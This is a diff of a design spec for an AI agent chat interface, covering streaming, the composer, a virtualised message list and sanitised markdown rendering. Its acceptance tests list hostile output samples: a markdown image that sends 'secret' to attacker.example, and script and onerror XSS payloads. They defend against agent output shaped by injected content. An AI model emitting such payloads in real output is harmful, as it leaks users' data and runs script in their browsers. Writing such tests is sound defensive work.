@@ -16,13 +16,15 @@ Agent output is attacker-controlled the moment an agent reads a web page or a do
 ## Scope
 
 - Routes: `/agents/$agentId/chat` (chat list plus a new-chat composer) and `/agents/$agentId/chat/$chatId`. The list shows every chat of the agent, including other members' and public visitors' chats (read-only for chats the owner did not start), with a source label. Whether the composer is shown is decided by `can('chats.send')` and whether the chat belongs to the current member, never by role name.
-- `ChatPanel` component (`src/features/chat/chat-panel.tsx`) reusable by U-04's test step: message list, composer, stop button, connection state.
-- Streaming through the client port: `sendMessage(chatId, input, { signal })` returning an async iterable of typed events from C-04 (at least `delta`, `tool-call`, `done`, `error`). Stop aborts the iterable and calls the API's cancel endpoint so the engine stops generating. A dropped stream marks the message "interrupted", refetches the chat from the server and offers "Retry", which re-sends only on click.
-- Composer: `Textarea`, Enter sends, Shift+Enter inserts a newline, disabled while a reply streams, `Esc` or the Stop button stops, length limit from the API.
-- Message list: auto-scroll while at the bottom; a "Jump to latest" button when the user has scrolled up; one `aria-live="polite"` announcement when a reply finishes (not per token).
+- Chat list: `DataTable` from `@ptbk/ui` in server-side mode (title or first message, source label, started by, last message time, message count), cursor and source filter in typed search params so the view is linkable; card layout below 768 px. Chat links preload the chat's first message page on intent.
+- `ChatPanel` component (`src/features/chat/chat-panel.tsx`) reusable by U-04's test step: message list, composer, stop button, connection state. It stays in engine-ui; only its primitives come from `@ptbk/ui`.
+- Streaming through the client port: `sendMessage(chatId, input, { signal })` returning an async iterable of typed events from C-04 (C-04's `ReplyStreamEvent`: `delta`, `completed`, `failed`; add `tool-call` to C-04 first if the UI needs it). Stop aborts the iterable and calls the API's cancel endpoint so the engine stops generating. A dropped stream marks the message "interrupted", refetches the chat from the server and offers "Retry", which re-sends only on click. No polling: stream events drive the reducer, and the cache is updated from them (Design notes).
+- Composer: `Textarea` from `@ptbk/ui`, Enter sends, Shift+Enter inserts a newline, disabled while a reply streams, `Esc` or the Stop button stops, length limit from the API. Sending appends the user message optimistically; if the send call fails, the message is removed, the text goes back into the composer and an error toast explains why.
+- Message list: older messages load upward with `useInfiniteQuery` over the paged messages endpoint; long histories are virtualised with `@tanstack/react-virtual` 3.14.x (dynamic row measurement; declared in engine-ui at the exact version `@ptbk/ui` uses) above a threshold of about 200 messages, keeping scroll position when older pages arrive; auto-scroll while at the bottom; a "Jump to latest" button when the user has scrolled up; one `aria-live="polite"` announcement when a reply finishes (not per token).
+- States: skeletons for the list and the message history, empty states (no chats yet; new chat), error states with retry, chat not found; the route error boundary catches the rest (U-02).
 - Rendering (`src/features/chat/render/`):
   - User messages: plain text, whitespace preserved.
-  - Agent messages while streaming: plain text. After `done`: markdown, per the spec ("sanitised after the stream ends").
+  - Agent messages while streaming: plain text. After `completed`: markdown, per the spec ("sanitised after the stream ends").
   - Markdown: `react-markdown` + `remark-gfm`, `skipHtml`, no `rehype-raw`. Raw HTML in the source shows as literal text. Allowed nodes: paragraphs, headings (rendered one level lower), emphasis, strong, strikethrough, lists, task lists (checkboxes disabled), blockquotes, tables, thematic breaks, inline code, code blocks, links.
   - Links: only absolute `http:`/`https:` URLs to another origin become `ExternalLink` with the full URL visible on hover and focus. `javascript:`, `data:`, `vbscript:`, `blob:`, `file:`, relative and same-origin URLs render as plain text. One function, `src/security/safe-url.ts`, decides.
   - Images: never an `<img>`. Rendered as text "Image: <alt> (<host>)", linked under the same URL rule.
@@ -37,14 +39,15 @@ Agent output is attacker-controlled the moment an agent reads a web page or a do
 ## Design notes
 
 - No `dangerouslySetInnerHTML` and no HTML parsing anywhere in the pipeline, so the `ptbk-html` Trusted Types policy is not needed here. If a future need appears, create `src/security/trusted-html.ts` with DOMPurify (`RETURN_TRUSTED_TYPE`) as the only place allowed to produce HTML, and add a test for it.
-- Streaming state lives in a reducer (`idle | streaming | stopping | done | interrupted | error`), not in the query cache; the final message is written to the cache on `done`.
+- Streaming state lives in a reducer (`idle | streaming | stopping | done | interrupted | error`), not in the query cache; the final message is written to the cache with `setQueryData` on the chat's messages key on `completed`, so nothing refetches or polls. TanStack Query's streamed-query helper was considered and not used: stop, interrupted and retry need the reducer's states.
+- Virtualisation breaks the browser's find-in-page for off-screen messages; that is why it starts only above the threshold.
 - Tests drive the stream with a controllable async generator (resolve each event by hand), no timers or sleeps.
 
 ## Acceptance criteria
 
-- [ ] Streaming test: deltas appear in order; markdown renders only after `done`; the live region announces once.
+- [ ] Streaming test: deltas appear in order; markdown renders only after `completed`; the live region announces once.
 - [ ] Stop test: aborts the iterable, calls cancel once, keeps the partial text and marks it stopped; a second click does nothing.
-- [ ] Dropped stream and `error` event each show their state; Retry re-sends only on click.
+- [ ] Dropped stream and `failed` event each show their state; Retry re-sends only on click.
 - [ ] Hostile output tests (each asserts the DOM and that no `img`, `script`, `iframe` or `a[href]` with a forbidden scheme exists):
   - [ ] `![x](https://attacker.example/?d=secret)` renders no `<img>` and starts no request (spy on `fetch` and image loads);
   - [ ] `<script>alert(1)</script>` and `<img src=x onerror=alert(1)>` render as literal text;
@@ -54,11 +57,15 @@ Agent output is attacker-controlled the moment an agent reads a web page or a do
 - [ ] Code block test: a TypeScript block yields highlight spans; an unknown language renders as plain text; copy puts the exact text on the clipboard.
 - [ ] `test:csp` sends a message against the in-memory client's scripted reply containing the hostile samples and records zero violations and zero non-`'self'` requests.
 - [ ] Keyboard: send, newline, stop and jump-to-latest work without a mouse; `axe-core` passes.
+- [ ] Optimistic send: a failed send removes the message, restores the composer text and shows an error toast.
+- [ ] A chat with 2,000 seeded messages mounts only the visible window, loads older pages on scroll up without jumping, and jump-to-latest reaches the newest message.
+- [ ] Chat list: source filter and cursor are written to the URL and restored on reload; empty, error and not-found states each have a test.
+- [ ] `test:csp` passes the UX checks (360 px without overflow, layout shift, reduced motion) on the chat list and a chat; both routes stay within their bundle budgets (lazily loaded language parsers do not count toward the route).
 - [ ] `bun run check` passes.
 - [ ] **Status** line above set to `done (#<PR>)`.
 
 ## Risks and open points
 
-- Rendering plain text until `done` follows the spec literally but reflows the message at the end. Rendering markdown incrementally is equally safe here because no HTML is ever parsed; changing it needs a short ADR, not a silent deviation.
+- Rendering plain text until `completed` follows the spec literally but reflows the message at the end. Rendering markdown incrementally is equally safe here because no HTML is ever parsed; changing it needs a short ADR, not a silent deviation.
 - C-04 must define the stream event union, cancel, and chat listing across all sources; amend the contract first if missing.
 - Whether the client uses `EventSource` or `fetch` with a stream reader is a C-04 detail; the UI only sees the async iterable.
